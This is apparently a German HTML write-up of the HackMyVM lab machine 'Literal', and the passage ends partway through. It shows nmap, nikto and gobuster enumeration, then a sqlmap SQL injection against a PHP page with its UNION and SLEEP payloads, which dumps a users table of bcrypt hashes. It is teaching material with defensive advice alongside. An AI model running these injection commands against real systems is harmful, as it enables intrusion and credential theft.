@@ -1,0 +1,972 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Literal - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Literal - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">Web Browser</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">ssh-keyscan</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">Crackstation (Website)</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">vi / Editor</div>
+                <div class="tool-item">hydra (versucht)</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">cut</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">whoami</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis (SQL Injection)</a></li>
+                <li><a href="#credential-cracking">Credential Cracking</a></li>
+                <li><a href="#initial-access">Initial Access (carlos)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (carlos -> root)</a></li>
+                <li><a href="#poc">Proof of Concept (Sudo Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der obligatorische `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerk zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host wird unter `192.168.2.132` mit der MAC-Adresse `08:00:27:4c:64:e1` (PCS Systemtechnik GmbH -> VirtualBox) gefunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Nmap-Scan auf `192.168.2.132` durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standard-Netzwerksicherheitsmaßnahmen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.153
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1       00:50:56:c0:00:08       VMware, Inc.
+192.168.2.132     08:00:27:4c:64:e1       PCS Systemtechnik GmbH
+192.168.2.254     00:50:56:f8:46:8c       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.869 seconds (136.97 hosts/sec). 3 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf `192.168.2.132` durchgeführt, um offene Ports, Dienste, Versionen und Betriebssystem zu ermitteln. Optionen: `-sS` (SYN Scan), `-sC` (Standard Scripts), `-T5` (Insane Timing), `-AO` (OS Detection), `-p-` (Alle Ports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nmap findet zwei offene Ports:
+                *   **Port 22/tcp:** SSH (OpenSSH 8.2p1 Ubuntu).
+                *   **Port 80/tcp:** HTTP (Apache httpd 2.4.41 Ubuntu). **Wichtig:** Der HTTP-Titel zeigt einen Redirect auf `http://blog.literal.hmv`. Dies deutet auf einen virtuellen Host hin, der über den Hostnamen angesprochen werden muss. Der `Service Info`-Teil bestätigt den Hostnamen `blog.literal.hmv`.
+                Die OS-Erkennung ist unsicher, tippt aber stark auf Linux.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fügen Sie den Hostnamen `blog.literal.hmv` zur `/etc/hosts`-Datei hinzu (`192.168.2.132 blog.literal.hmv`). Untersuchen Sie die Webanwendung unter `http://blog.literal.hmv/`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie SSH und Apache. Stellen Sie sicher, dass Weiterleitungen korrekt konfiguriert sind und keine sensiblen Informationen preisgeben. Halten Sie das Betriebssystem und die Dienste aktuell.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.132 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 13:45 CEST
+Nmap scan report for literal (192.168.2.132)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 30ca559468338b5042f4c2b5139966fe (RSA)
+|   256 2db05e6b96bd0be314fbe0d058845085 (ECDSA)
+|_  256 92d92a5d6f58db8556d60c9968b85964 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41
+|_http-title: Did not follow redirect to http://blog.literal.hmv
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+MAC Address: 08:00:27:4C:64:E1 (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 5.0 - 5.3 (99%), Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 4.15 - 5.6 (96%), Sony X75CH-series Android TV (Android 5.0) (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms literal (192.168.2.132)
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.41 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein `nikto`-Scan wird gegen den virtuellen Host `http://blog.literal.hmv/` ausgeführt (Annahme: `/etc/hosts` wurde angepasst).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto bestätigt Apache/2.4.41 (veraltet). Es meldet:
+                *   Fehlende Security Header (`X-Frame-Options`, `X-Content-Type-Options`).
+                *   ETag-Inode-Leak.
+                *   `PHPSESSID`-Cookie ohne `HttpOnly`-Flag bei `login.php`.
+                *   `/config.php` gefunden (potenziell sensible Informationen).
+                *   Directory Indexing für `/images/`.
+                *   `/login.php` als Admin-Login identifiziert.
+                Wichtige Funde sind die veraltete Apache-Version, `config.php` und `login.php`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie `config.php` (auch wenn sie leer zu sein scheint, wie Gobuster später zeigt), `login.php` und die Registrierungsfunktion (falls vorhanden). Prüfen Sie die Apache-Version auf Exploits. Führen Sie Directory/File Busting durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Aktualisieren Sie Apache. Implementieren Sie fehlende Security Header und setzen Sie das `HttpOnly`-Flag für Session-Cookies. Schützen Sie Konfigurationsdateien (`config.php`) vor direktem Zugriff. Deaktivieren Sie Directory Indexing.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://blog.literal.hmv/</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.132
++ Target Hostname:    blog.literal.hmv
++ Target Port:        80
++ Start Time:         2023-04-20 13:48:19 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Server may leak inodes via ETags, header found with file /, inode: cfd, size: 5f8cdfae26449, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
++ /config.php: PHP Config file may contain database IDs and passwords.
++ /images/: Directory indexing found.
++ /login.php: Admin login page/section found.
++ 8046 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2023-04-20 13:48:29 (GMT2) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien unter `http://blog.literal.hmv/` zu finden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Gobuster findet mehrere PHP-Seiten:
+                *   `/register.php`: Eine Registrierungsseite.
+                *   `/login.php`: Bestätigt den Login.
+                *   `/logout.php`: Logout-Funktion.
+                *   `/config.php`: Konfigurationsdatei (Größe 0, scheint leer oder geschützt).
+                *   `/dashboard.php`: Ein Dashboard, leitet aber zu `login.php` weiter (Authentifizierung erforderlich).
+                *   `/next_projects_to_do.php`: Eine zusätzliche Seite, möglicherweise mit Funktionalität.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Registrieren Sie einen Testbenutzer über `/register.php`. Melden Sie sich über `/login.php` an und greifen Sie auf `/dashboard.php` zu. Untersuchen Sie die Funktionalität von `/next_projects_to_do.php`, insbesondere auf SQL-Injection oder andere Schwachstellen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://blog.literal.hmv/ -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.5
+# ... (options) ...
+===============================================================
+Starting gobuster
+===============================================================
+http://blog.literal.hmv/index.html               (Status: 200) [Size: 3325]
+http://blog.literal.hmv/images                   (Status: 301) [Size: 321] [--> http://blog.literal.hmv/images/]
+http://blog.literal.hmv/register.php             (Status: 200) [Size: 2159]
+http://blog.literal.hmv/login.php                (Status: 200) [Size: 1893]
+http://blog.literal.hmv/logout.php               (Status: 302) [Size: 0] [--> login.php]
+http://blog.literal.hmv/config.php               (Status: 200) [Size: 0]
+http://blog.literal.hmv/fonts                    (Status: 301) [Size: 320] [--> http://blog.literal.hmv/fonts/]
+http://blog.literal.hmv/dashboard.php            (Status: 302) [Size: 0] [--> login.php]
+http://blog.literal.hmv/next_projects_to_do.php  (Status: 200) [Size: 2503] # Status 200 -> Interessant!
+===============================================================
+Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Nach der Registrierung und Anmeldung (hier implizit als Benutzer `ben`) wird die Seite `/dashboard.php` aufgerufen. Der Text auf der Seite wird analysiert.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Das Dashboard enthält nur beschreibenden Text über Projekte und scheint keine interaktive Funktionalität oder direkte Angriffspunkte zu bieten.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie `/next_projects_to_do.php`, da diese Seite von Gobuster gefunden wurde und potenziell Funktionalität enthält.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Inhalt von http://blog.literal.hmv/dashboard.php (nach Login als 'ben')
+
+Hi, ben.
+Here are my projects and future thougths. I'm saving my next things, maybe trash, maybe incredibly trash or maybe yes, trash. Anyway, I'm working alone, so time is relevant, but no a problem, everything with calm. (The page is ugly, I'm still learning).
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis (SQL Injection)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, GET-Parameter für `/config.php` und `/next_projects_to_do.php` mittels `wfuzz` zu fuzzing. `--hh 0` filtert leere Antworten heraus.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Beide `wfuzz`-Läufe finden keine gültigen GET-Parameter, die eine andere Antwort als die Standardseite (oder eine leere Antwort) hervorrufen. Dies deutet darauf hin, dass diese Seiten entweder keine GET-Parameter akzeptieren oder die Schwachstelle woanders liegt (z.B. POST-Parameter).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da GET-Parameter unwahrscheinlich sind, konzentrieren Sie sich auf POST-Parameter, insbesondere bei `login.php` und `next_projects_to_do.php`. Verwenden Sie `sqlmap` oder manuelle Tests mit POST-Daten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blog.literal.hmv/config.php?FUZZ=id --hh 0</span></div>
+                     <pre>
+# Wfuzz Banner...
+Target: http://blog.literal.hmv/config.php?FUZZ=id
+Total requests: 220560
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+# Keine Ergebnisse (nur gefilterte Requests)
+Total time: 137.2374
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: 1607.141
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blog.literal.hmv/next_projects_to_do.php?FUZZ=id --hh 0</span></div>
+                     <pre>
+# Wfuzz Banner...
+Target: http://blog.literal.hmv/next_projects_to_do.php?FUZZ=id
+Total requests: 220560
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+# Keine Ergebnisse (nur gefilterte Requests)
+Total time: 134.2123
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: 1643.366
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `sqlmap` wird auf `login.php` mit einem Testparameter `id=2` angesetzt. Level 3 und Risk 3 werden verwendet, um gründlicher zu testen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `sqlmap` findet keine SQL-Injection-Schwachstelle in diesem Parameter ("all tested parameters do not appear to be injectable").
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie `sqlmap` auf andere Seiten und Parameter, insbesondere POST-Parameter bei `login.php` und `next_projects_to_do.php`.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u 'http://blog.literal.hmv/login.php?id=2' --risk 3 --level 3 --dbs</span></div>
+                     <pre>
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.7.3#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+# ... (Tests laufen) ...
+[14:55:57] [WARNING] parameter 'Referer' does not seem to be injectable
+[14:55:57] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+
+[*] ending @ 14:55:57 /2023-04-20/
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Es wird Subdomain-Fuzzing mit `wfuzz` durchgeführt, um weitere virtuelle Hosts zu finden. Zuerst auf `literal.hmv`, dann auf `blog.literal.hmv`.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der erste Scan findet `blog.literal.hmv` (bereits bekannt). Der zweite Scan auf `blog.literal.hmv` findet keine weiteren Subdomains. Es scheint nur `blog.literal.hmv` zu geben.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u literal.hmv -H "Host: FUZZ.literal.hmv" --hw 28</span></div>
+                     <pre>
+# Wfuzz Banner...
+Target: http://literal.hmv/
+Total requests: 114441
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+000000018:   200        78 L     398 W      3325 Ch     "blog"
+# ... (Rauscheinträge) ...
+Total time: ...
+Processed Requests: 114441
+Filtered Requests: 114436
+Requests/sec.: ...
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u blog.literal.hmv -H "Host: FUZZ.blog.literal.hmv" --hw 28</span></div>
+                      <pre>
+# Wfuzz Banner...
+Target: http://blog.literal.hmv/
+Total requests: 114441
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+# Keine relevanten Ergebnisse (nur Rauscheinträge)
+Total time: ...
+Processed Requests: 114441
+Filtered Requests: 114437
+Requests/sec.: ...
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Es werden verschiedene SSH-Enumerationsschritte durchgeführt: `ssh-keyscan`, `nmap` mit `--script ssh-auth-methods` und `--script ssh2-enum-algos`, `nikto` erneut (redundant).
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Diese Scans bestätigen die SSH-Hostschlüssel, die erlaubten Authentifizierungsmethoden (`publickey`, `password` für root) und die unterstützten Algorithmen. Sie liefern keine neuen Angriffspunkte.
+             </p>
+             <!-- SSH Scans (gekürzt) -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh-keyscan literal.hmv</span></div>
+                     <pre># literal.hmv:22 SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2 ...</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -p22 192.168.2.132 --script ssh-auth-methods --script-args="ssh.user=root" -d</span></div>
+                     <pre>
+# ...
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+| ssh-auth-methods:
+|   Supported authentication methods:
+|     publickey
+|_    password
+# ...
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -p22 blog.literal.hmv --script ssh2-enum-algos</span></div>
+                     <pre>
+# ...
+| ssh2-enum-algos:
+|   kex_algorithms: (9) ...
+|   server_host_key_algorithms: (5) ...
+|   encryption_algorithms: (6) ...
+|   mac_algorithms: (10) ...
+|   compression_algorithms: (2) ...
+# ...
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> `sqlmap` wird nun auf `next_projects_to_do.php` angesetzt, diesmal mit POST-Daten (`sentence-query=A*`) und einem gültigen Session-Cookie (`PHPSESSID=...`), der vermutlich nach dem Login als Benutzer `ben` erhalten wurde. `--technique U` beschränkt den Test auf UNION-basierte Injection. `-D blog -T users --dump` zielt darauf ab, die `users`-Tabelle aus der `blog`-Datenbank zu dumpen.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Erfolg!** `sqlmap` identifiziert eine UNION-basierte SQL-Injection im POST-Parameter `sentence-query`. Es findet die Datenbank `blog` und die Tabelle `users`. Der Dump der `users`-Tabelle ist erfolgreich und enthüllt 18 Benutzereinträge mit Benutzernamen, E-Mails und bcrypt-Passwort-Hashes (`$2y$10$...`).
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Versuchen Sie, die bcrypt-Hashes mit `john` oder `hashcat` und einer guten Wortliste (z.B. `rockyou.txt`) zu knacken. Extrahieren Sie die Benutzernamen und Hashes für den Cracking-Versuch. Untersuchen Sie auch die zweite gefundene Tabelle (`projects`). Prüfen Sie, ob auf anderen VHosts (wie `forumtesting.literal.hmv`) weitere Datenbanken existieren.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Kritische Schwachstelle!** Beheben Sie die SQL-Injection in `next_projects_to_do.php` sofort. Verwenden Sie Prepared Statements. Überprüfen Sie alle Datenbankabfragen auf ähnliche Schwachstellen. Verwenden Sie starke, einzigartige Passwörter und erzwingen Sie Passwortrichtlinien. Ändern Sie alle kompromittierten Passwörter.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u "http://blog.literal.hmv/next_projects_to_do.php" --data "sentence-query=A*" -H "Cookie: PHPSESSID=glo1viov98iv7h6tjtt15e954r" --batch -D blog -T users --dump</span></div>
+                     <pre>
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.7.3#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:45:40 /2023-04-23/
+
+[22:45:40] [INFO] resuming back-end DBMS 'mysql'
+[22:45:40] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sentence-query=A' AND (SELECT 1597 FROM (SELECT(SLEEP(5)))FhLL) AND 'sbBQ'='sbBQ
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: sentence-query=A' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7176627171,0x414f536271596d6c5371544e61624170577165477a726e424a524564614b765a4b6d70736f4b5253,0x717a786a71)-- -
+---
+[22:45:41] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[22:45:41] [INFO] fetching columns for table 'users' in database 'blog'
+[22:45:41] [INFO] fetching entries for table 'users' in database 'blog'
+Database: blog
+Table: users
+[18 entries]
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
+| userid | username  | useremail                        | userpassword                                                 | usercreatedate      |
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
+| 1      | test      | test@blog.literal.htb            | $2y$10$wWhvCz1pGsKm..jh/lChIOA7aJoZRAil40YKlGFiw6B.6a77WzNma | 2023-04-07 17:21:47 |
+| 2      | admin     | admin@blog.literal.htb           | $2y$10$fjNev2yv9Bi1IQWA6VOf9Owled5hExgUZNoj8gSmc7IdZjzuOWQ8K | 2023-04-07 17:21:47 |
+| 3      | carlos    | carlos@blog.literal.htb          | $2y$10$ikI1dN/A1lhkKLmiKl.cJOkLiSgPUPiaRoopeqvD/.p.bh0w.bJBW | 2023-04-07 17:21:48 |
+| 4      | freddy123 | freddy123@zeeli.moc              | $2y$10$yaf9nZ6UJkf8103R8rMdtOUC.vyZUek4vXVPas3CPOb4EK8I6eAUK | 2023-04-07 17:21:48 |
+| 5      | jorg3_M   | jorg3_M@zeeli.moc                | $2y$10$lZ./Zflz1EEFdYbWp7VUK.415Ni8q9kYk3LJ2nF0soRJG1RymtDzG | 2023-04-07 17:21:48 |
+| 6      | aNdr3s1to | aNdr3s1to@puertonacional.ply     | $2y$10$F2Eh43xkXR/b0KaGFY5MsOwlnh4fuEZX3WNhT3PxSw.6bi/OBA6hm | 2023-04-07 17:21:48 |
+| 7      | kitty     | kitty@estadodelarte.moc          | $2y$10$rXliRlBckobgE8mJTZ7oXOaZr4S2NSwqinbUGLcOfCWDra6v9bxcW | 2023-04-07 17:21:48 |
+| 8      | walter    | walter@forumtesting.literal.hmv  | $2y$10$er9GaSRv1AwIwu9O.tlnnePNXnzDfP7LQMAUjW2Ca1td3p0Eve6TO | 2023-04-07 17:21:48 |
+| 9      | estefy    | estefy@caselogic.moc             | $2y$10$hBB7HeTJYBAtdFn7Q4xzL.WT3EBMMZcuTJEAvUZrRe.9szCp19ZSa | 2023-04-07 17:21:48 |
+| 10     | michael   | michael@without.you              | $2y$10$sCbKEWGgAUY6a2Y.DJp8qOIa250r4ia55RMrDqHoRYU3Y7pL2l8Km | 2023-04-07 17:21:48 |
+| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv | $2y$10$7itXOzOkjrAKk7Mp.5VN5.acKwGi1ziiGv8gzQEK7FOFLomxV0pkO | 2023-04-07 17:21:48 |
+| 12     | fel1x     | fel1x@without.you                | $2y$10$o06afYsuN8yk0yoA.SwMzucLEavlbI8Rl43.S0tbxL.VVSbsCEI0m | 2023-04-07 17:21:48 |
+| 13     | kelsey    | kelsey@without.you               | $2y$10$vxN98QmK39rwvVbfubgCWO9W2alVPH4Dp4Bk7DDMWRvfN995V4V6. | 2023-04-07 17:21:48 |
+| 14     | jtx       | jtx@tiempoaltiempo.hy            | $2y$10$jN5dt8syJ5cVrlpotOXibeNC/jvW0bn3z6FetbVU/CeFtKwhdhslC | 2023-04-07 17:21:48 |
+| 15     | DRphil    | DRphil@alcaldia-tol.gob          | $2y$10$rW58MSsVEaRqr8uIbUeEeuDrYB6nmg7fqGz90rHYHYMt2Qyflm1OC | 2023-04-07 17:21:48 |
+| 16     | carm3N    | carm3N@estadodelarte.moc         | $2y$10$D7uF6dKbRfv8U/M/mUj0KujeFxtbj6mHCWT5SaMcug45u7lo/.RnW | 2023-04-07 17:21:48 |
+| 17     | lanz      | lanz@literal.htb                 | $2y$10$PLGN5.jq70u3j5fKpR8R6.Zb70So/8IWLi4e69QqJrM8FZvAMf..e | 2023-04-07 17:55:36 |
+| 18     | ben       | ben@ben.de                       | $2y$10$Gxb19/1yUZSHEdiMTT9YOuFKcGYGaNqn5HOJ7XPEtFJ9.J9AKs/rO | 2023-04-20 11:50:55 |
++--------+-----------+----------------------------------+--------------------------------------------------------------+---------------------+
+
+[22:45:46] [INFO] table 'blog.users' dumped to CSV file '/root/.local/share/sqlmap/output/blog.literal.hmv/dump/blog/users.csv'
+[22:45:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/blog.literal.hmv'
+
+[*] ending @ 22:45:46 /2023-04-23/
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester bemerkt die E-Mail-Adressen `walter@forumtesting.literal.hmv` und `r1ch4rd@forumtesting.literal.hmv` in der `users`-Tabelle. Dies deutet auf einen weiteren virtuellen Host `forumtesting.literal.hmv` hin. Die lokale `/etc/hosts`-Datei wird angepasst, um diesen neuen Hostnamen ebenfalls auf die IP `192.168.2.134` (Achtung: wieder eine andere IP als im arp-scan, 192.168.2.132) zu mappen. *Anmerkung: Es wird angenommen, dass 192.168.2.132 die korrekte IP ist, wie im Nmap-Scan.*
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen des neuen VHosts zur `/etc/hosts`-Datei ist ein korrekter Schritt, um die Anwendung unter diesem Namen zu erreichen. Die Entdeckung eines weiteren VHosts erweitert die Angriffsfläche.
+            </p>
+            <p class="recommendation">
